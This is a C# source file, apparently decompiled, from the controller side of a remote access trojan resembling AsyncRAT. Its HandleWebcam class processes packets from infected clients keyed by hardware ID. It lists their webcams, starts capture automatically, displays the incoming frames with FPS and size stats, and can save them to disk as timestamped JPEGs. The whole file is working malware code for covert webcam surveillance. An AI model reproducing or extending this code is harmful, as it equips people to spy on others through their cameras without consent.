using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;
using MessagePackLib.MessagePack;
using Server.Connection;
using Server.Forms;
using Server.Helper;

namespace Server.Handle_Packet;

internal class HandleWebcam
{
	public HandleWebcam(MsgPack unpack_msgpack, Clients client)
	{
		string asString = unpack_msgpack.ForcePathObject("Command").AsString;
		if (!(asString == "getWebcams"))
		{
			if (!(asString == "capture"))
			{
				return;
			}
			FormWebcam formWebcam = (FormWebcam)Application.OpenForms["Webcam:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
			try
			{
				if (formWebcam != null)
				{
					using (MemoryStream memoryStream = new MemoryStream(unpack_msgpack.ForcePathObject("Image").GetAsBytes()))
					{
						formWebcam.GetImage = (Image)Image.FromStream(memoryStream).Clone();
						formWebcam.pictureBox1.Image = formWebcam.GetImage;
						formWebcam.FPS++;
						if (formWebcam.sw.ElapsedMilliseconds >= 1000)
						{
							if (formWebcam.SaveIt)
							{
								if (!Directory.Exists(formWebcam.FullPath))
								{
									Directory.CreateDirectory(formWebcam.FullPath);
								}
								formWebcam.pictureBox1.Image.Save(formWebcam.FullPath + "\\IMG_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".jpeg", ImageFormat.Jpeg);
							}
							string[] obj = new string[10]
							{
								"Webcam:",
								unpack_msgpack.ForcePathObject("Hwid").AsString,
								"    FPS:",
								null,
								null,
								null,
								null,
								null,
								null,
								null
							};
							int fPS = formWebcam.FPS;
							obj[3] = fPS.ToString();
							obj[4] = "    Screen:";
							obj[5] = formWebcam.GetImage.Width.ToString();
							obj[6] = " x ";
							obj[7] = formWebcam.GetImage.Height.ToString();
							obj[8] = "    Size:";
							obj[9] = Methods.BytesToString(memoryStream.Length);
							formWebcam.Text = string.Concat(obj);
							formWebcam.FPS = 0;
							formWebcam.sw = Stopwatch.StartNew();
						}
						return;
					}
				}
				client.Disconnected();
				return;
			}
			catch
			{
				return;
			}
		}
		FormWebcam formWebcam2 = (FormWebcam)Application.OpenForms["Webcam:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
		try
		{
			if (formWebcam2 != null)
			{
				formWebcam2.Client = client;
				formWebcam2.timer1.Start();
				string[] array = unpack_msgpack.ForcePathObject("List").AsString.Split(new string[1] { "-=>" }, StringSplitOptions.None);
				foreach (string text in array)
				{
					if (!string.IsNullOrWhiteSpace(text))
					{
						formWebcam2.comboBox1.Properties.Items.Add(text);
					}
				}
				formWebcam2.comboBox1.SelectedIndex = 0;
				if (formWebcam2.comboBox1.Text == "None")
				{
					client.Disconnected();
					return;
				}
				formWebcam2.comboBox1.Enabled = true;
				formWebcam2.button1.Enabled = true;
				formWebcam2.btnSave.Enabled = true;
				formWebcam2.numericUpDown1.Enabled = true;
				formWebcam2.labelWait.Visible = false;
				formWebcam2.button1.PerformClick();
			}
			else
			{
				client.Disconnected();
			}
		}
		catch
		{
		}
	}
}
